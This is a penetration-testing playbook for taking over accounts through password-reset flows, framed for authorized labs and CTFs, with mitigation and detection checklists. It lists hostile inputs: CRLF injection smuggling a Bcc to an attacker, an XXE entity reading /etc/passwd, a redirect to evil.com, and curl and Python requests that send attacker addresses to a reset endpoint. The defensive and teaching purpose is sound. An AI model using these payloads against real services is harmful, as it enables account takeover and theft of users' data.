Account Takeover via Password Reset — Email Payloads & Practical Test Plan — OmniWatch (adce626)

Scope & warning: practical playbook for abusing password‑reset flows via email payloads and parser edge cases. For authorized security testing, red‑team, or CTF environments only. Do not test production systems without explicit permission. Log everything.

Objective

Find weaknesses in password‑reset flows that allow an attacker to cause a reset token or link to be issued to an attacker‑controlled mailbox or to otherwise reset a victim’s password and take over the account.

Success (CTF): obtain a valid reset token/link for the target account and use it to set a new password and log in.

Threat model & assumptions

Attacker can send HTTP(S) requests to the target reset endpoint.

Attacker controls at least one mailbox or domain (catch‑all preferred).

Target environment may have parser, canonicalization, template, or routing inconsistencies.

Tests must be performed in staging / lab or with explicit authorization.

Tools & test environment

Burp Suite (Repeater/Intruder), curl, wfuzz/ffuf.

Python (requests), concurrency for race tests.

A catch‑all mailbox (or controlled mail server) to receive test emails.

Logging: capture raw requests, raw responses, and incoming email headers/bodies.

Testing methodology (practical)

Baseline: perform a legitimate reset for a known test account. Capture request/response, outgoing email (headers + body), link/token format, and token lifetime.

Low‑risk phase: test whitespace, case, alternate fields, common encodings. Observe responses.

Escalation phase (staging only): test null bytes, control chars, double‑encoding, XML entities, large payloads, and race conditions.

Reproduce minimal PoC: when you find a positive result, strip the payload to the smallest form that reproduces it; this isolates root cause.

Document everything: raw requests, timestamps, mail headers, screenshots of successful login or token use.

What to look for (observable success indicators)

HTTP status changing from 4xx/403 → 200 for manipulated payloads.

Outgoing reset e‑mail delivered to an attacker‑controlled address.

Reset link or token present in the email body for an attacker recipient.

Changes in Content‑Length, Location header, Set‑Cookie, or other headers.

Template errors, stack traces, or unusual latency that reveal internal behavior.

Detailed test cases — 20 focused categories

Each category contains: what to test, why it matters, practical payloads/examples, what to observe, and mitigation notes.

1) Empty / omitted fields

What: Submit reset requests with the email field missing, empty, or null (form & JSON).
Why: Some flows treat missing fields as wildcards or fallback to default addresses (admin, support) or perform different lookup logic.
Examples:

JSON: {} , {"email":""} , {"email":null}

Form: omit email= or send email= empty.
Observe: 200 with success message; reset email to fallback/admin/catch‑all; logs showing default selection.
Mitigation: Require non‑empty validated email; return clear 4xx for missing data; rate‑limit.

2) Whitespace simulation

What: Prefix/suffix spaces, tabs, or newlines in the email field.
Why: Inconsistent trimming across layers can cause the lookup and notification layers to disagree. Templates may be corrupted (header bleed).
Examples: {"email":" victim@example.com"}, email=victim@example.com%20, {"email":"victim@example.com\n"}
Observe: Successful reset only for whitespace variant; header injection; email delivered to attacker mailbox.
Mitigation: Trim and canonicalize inputs before validation and before template inclusion; escape template values.

3) Duplicate parser / parameter pollution

What: Send the same parameter in multiple places (query string + JSON body) or duplicate keys in multipart/form-data.
Why: Different parsers may pick first/last occurrence; auth and notification paths may read different sources.
Examples:

POST /reset?email=attacker@b.com with body {"email":"victim@a.com"}

multipart: part1 email=victim@a.com, part2 payload={"email":"attacker@b.com"}
Observe: Reset email delivered to attacker address only when duplicates exist; inconsistent responses.
Mitigation: Establish strict parameter precedence; reject conflicting parameters; log duplicates.

4) Form‑encoded specifics

What: Test application/x-www-form-urlencoded nested keys and JSON-as-string in form fields.
Why: Legacy parsers or frameworks might bind form fields directly to ORM models enabling mass‑assignment or alternate code paths.
Examples: user[email]=victim@example.com, payload={"email":"attacker@b.com"} (as form value).
Observe: Reset accepted only for form variants; emails to unexpected recipients.
Mitigation: Separate parsing and binding; validate field shapes; avoid direct mass‑assignment.

5) Plus (+) tag / subaddressing

What: Use plus addressing: victim+tag@example.com.
Why: Mail servers may canonicalize/strip +tag while the app matches exact stored address; catch‑all domains allow attackers to receive mails for victim+tag.
Examples: {"email":"victim+reset@domain.com"}
Observe: Reset email received by catch‑all attacker mailbox.
Mitigation: Require exact match to verified account email for resets.

6) Case variation / Unicode homoglyphs

What: Try different casing and replace characters with lookalike unicode glyphs (Cyrillic, Greek, etc.).
Why: Inconsistent normalization can lead to mismatched comparisons. Homoglyphs may bypass equality checks or registration verification.
Examples: Admin vs admin, аdmin (Cyrillic a).
Observe: Reset flows that accept the homoglyph/variant and produce tokens.
Mitigation: Unicode normalize (NFKC/NFC) and case normalize where appropriate; treat local‑part with considered policy.

7) Domain‑edge cases

What: Submit localhost, 127.0.0.1, IDN/punycode domains, or truncated domains.
Why: Validators may accept local/internal hostnames or odd domains leading to misrouting, SSRF‑like behavior in links, or local mail delivery attempts.
Examples: user@localhost, user@127.0.0.1, user@xn--... (IDN).
Observe: Reset link pointing to internal host; mailer trying local delivery; unusual bounce messages.
Mitigation: Disallow internal hostnames and require reasonable domain checks (e.g., MX validation where needed).

8) Control characters (staging only)

What: Inject CR/LF and other control sequences into fields that become headers or template parts.
Why: Header injection can add recipients (Bcc) or corrupt message templates.
Examples: victim@example.com\r\nBcc:attacker@x.com
Observe: Outgoing email headers include injected fields; attacker receives mail.
Mitigation: Strip/escape control characters; validate header values server‑side.

9) Null byte marker (staging only)

What: Append a null byte (\u0000) into input fields.
Why: Some legacy libraries treat null as string terminator leading to truncation or different path selection.
Examples: victim@example.com\u0000extra
Observe: Truncation or altered output, mail delivered to truncated address.
Mitigation: Reject non‑printable/control characters; canonicalize input.

10) Close‑open tag injection

What: Inject closing/opening HTML/XML tags into fields used in templates.
Why: Templating engines may be tricked into inserting content or exposing fields incorrectly.
Examples: "</div><admin>true</admin>" in profile fields.
Observe: Template errors, injected content in email body, or unexpected behavior.
Mitigation: Escape template contexts and validate inputs.

11) Buffer limits / out‑of‑bounds

What: Send oversized input to test truncation and alternative code paths.
Why: Truncation can produce collisions that match other accounts; large payloads can trigger different handling or errors.
Examples: email field > 1,000,000 characters.
Observe: 413/500 responses, truncated address leading to different recipient.
Mitigation: Enforce strict length limits and reject oversized inputs.

12) Non‑existent / malformed domain

What: Use domains that don’t exist or are malformed.
Why: Mailers may return bounce data revealing internal handling, or the system may accept and log defaults.
Examples: user@nonexistent.tld, user@-invalid.
Observe: bounce responses, generic errors or fallback behavior.
Mitigation: Basic domain format checks and optional MX lookup for sensitive flows.

13) Comma / semicolon lists

What: Put multiple addresses in one field separated by commas/semicolons.
Why: Parsers might split and use the first or last entry as recipient.
Examples: emails=a@x.com,b@y.com
Observe: Email delivered to first/last address; unexpected recipients.
Mitigation: Enforce single‑address fields; reject delimited lists.

14) Payload JSON shape variants

What: Send different JSON shapes: non‑object vs object, or JSON‑as‑string.
Why: Binding/coercion can produce mass‑assignment or different mapper behavior.
Examples: {"user":123}, {"payload":"{\"email\":\"attacker@b.com\"}"}
Observe: Acceptance only for certain shapes; mass‑assignment vulnerabilities.
Mitigation: Use JSON Schema validation; whitelist allowed shapes.

15) BOM / encoding anomalies

What: Prepend a BOM or use different encodings in JSON or file uploads.
Why: Naive string checks can be bypassed; incorrect parsing path may be taken.
Examples: \uFEFF{"email":"..."}
Observe: Parser errors or alternative handling.
Mitigation: Normalize encoding and strip BOM before parsing.

16) XML entity (XXE) — if XML accepted

What: Submit XML with external entities.
Why: XXE can exfiltrate internal files or change parsing behavior; not directly takeover but can reveal internal config.
Examples: <!ENTITY xxe SYSTEM "file:///etc/passwd"> usage.
Observe: entity content leaks or OOB callbacks.
Mitigation: Disable external entity resolution and use secure parsers.

17) Double‑encoded ambiguity (staging only)

What: Send values percent‑encoded twice or otherwise double‑encoded.
Why: Layered decoding pipelines might decode once then check — double encoding can bypass filters applied only after first decode.
Examples: %253Cscript%253E (double‑encoded <script>).
Observe: payload passes validation after full decode.
Mitigation: Canonicalize and decode fully before validation.

18) Localhost / TLD domain in callbacks

What: Use 127.0.0.1, localhost, .local, or other internal names in URLs or email domains.
Why: Reset links may point to internal endpoints or be executed differently.
Examples: {"callback":"http://127.0.0.1/admin"}
Observe: links referencing internal resources, SSRF potential.
Mitigation: Disallow internal hostnames in user‑controlled fields; validate callback URLs.

19) Escaped payload parts

What: Put percent‑encoded values inside JSON or forms.
Why: Downstream decoders might treat them differently; decoded value may bypass checks.
Examples: {"email":"victim%40example.com"}, {"redirect":"https%3A%2F%2Fevil.com"}
Observe: redirect to attacker domain or change in recipient.
Mitigation: Decode then validate; reject URI‑encoded emails unless explicitly allowed.

20) Forced mutation (typo/subdomain tests)

What: Test small domain mutations and subdomain variants (typosquatting).
Why: Aliasing, wildcards, and mail routing quirks can route mutated addresses to attacker mailboxes.
Examples: victim@dev.example.com, victim@examp1e.com.
Observe: unexpected deliveries, bounces with internal info.
Mitigation: verify email ownership at registration and avoid treating near‑typo domains as equivalent.

Practical examples (curl) — use in lab

Simple JSON reset:

curl -i -X POST "https://target.example/pw-reset" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'


Duplicate param (query + body):

curl -i -X POST "https://target.example/pw-reset?email=attacker@b.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'


Whitespace payload:

curl -i -X POST "https://target.example/pw-reset" \
  -H "Content-Type: application/json" \
  -d $'{"email":" victim@example.com\n"}'


Form‑encoded nested:

curl -i -X POST "https://target.example/pw-reset" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'user[email]=victim@example.com'

Simple automation skeleton (safe, for lab)
import requests
payloads = [
  {"email":"victim@example.com"},
  {"email":"victim+test@example.com"},
  {"email":" victim@example.com"},
  {"email":""},
  {"email":None},
]
url = "https://target.example/pw-reset"
for p in payloads:
    r = requests.post(url, json=p, timeout=8, verify=True)
    print(p, r.status_code, len(r.content))


Do not enable concurrency against production services. Use in controlled environments.

Reproducible PoC checklist

Save raw request and raw response that triggered the email.

Save raw inbound email (full headers + body) with timestamp.

Use the token/link to complete the reset in an isolated session; capture proof (screenshot, session cookie).

Reduce payload to minimal reproducer and document exact root cause.

Detection & logging guidance (for defenders)

Alert on many reset attempts with variations (plus‑tags, whitespace, duplicate params).

Log parameter sources (query vs body) and flag conflicts.

Monitor outbound mail recipients; alert if recipient differs from stored verified email.

Detect header anomalies in outbound mail (unexpected Bcc/To).

Practical mitigations (developer checklist)

Strict canonicalization: trim, Unicode normalize, strip control chars, decode percent‑encoding before validation.

Reject empty/missing fields with explicit 4xx.

Require exact, verified email match for reset flows.

Disallow internal hostnames in user‑controlled fields and callbacks.

Sign reset tokens (HMAC) and bind them to user ID, request ID, and short TTL.

Avoid mass‑assignment: do not bind raw input to ORM without whitelist.

Rate limit & captcha high‑volume reset flows.

Escape email template insertion and sanitize headers.

Expert notes (practical, no sugar)

Most real takeovers come from combinations: duplicate param + encoding oddness, or form‑encoded vs json binding differences. Don’t test single ideas in isolation; chain variants.

When you get a hit, minimize the payload. Developers need a reproducible minimal test-case, not a complex payload permutation.

Document the exact path: which layer read which value (query vs body vs form vs multipart). That’s the root cause you’ll report.
